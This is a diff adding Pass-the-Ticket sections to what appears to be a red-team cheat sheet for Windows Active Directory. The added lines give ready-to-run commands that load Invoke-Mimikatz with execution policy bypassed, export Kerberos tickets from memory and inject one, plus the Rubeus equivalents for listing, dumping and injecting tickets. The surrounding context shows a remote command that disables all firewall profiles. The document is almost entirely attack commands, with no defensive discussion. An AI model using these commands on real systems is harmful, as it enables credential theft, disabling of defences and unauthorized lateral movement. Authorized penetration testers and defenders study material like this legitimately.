@@ -93,3 +93,47 @@ Create a session variable and disable defences:
   Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -session $sess
   
   ``` 
+  
+  
+ ### Pass the Ticket Attack w/ mimikatz
+ 
+ Export all ticket to the current directory
+ 
+ ```powershell 
+ powershell -ep bypass
+ 
+ . .\invoke-mimikatz.ps1
+ 
+ invoke-mimikatz -command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'
+
+ invoke-mimikatz -command '"Mimikatz::debug" "kerberos::ptt <TICKET FILE NAME>"  "exit"'
+ 
+  ```
+  
+  Check cached tickets: 
+  
+  `klist`
+  
+  ### Pass the Ticket Attack w/ Rubeus
+ 
+ List all the tickets:
+ 
+  ```powershell 
+ .\Rubeus.exe klist
+ ```
+ 
+ Get more information about the tickets:
+ 
+ ```powershell
+ .\Rubeus.exe triage
+ ```
+ 
+ Dump the tickets:
+ 
+```powershell
+ .\Rubeus.exe dump
+```
+
+```powershell
+ .\Rubeus.exe ptt /ticket:<BASE64 TICKET>
+```
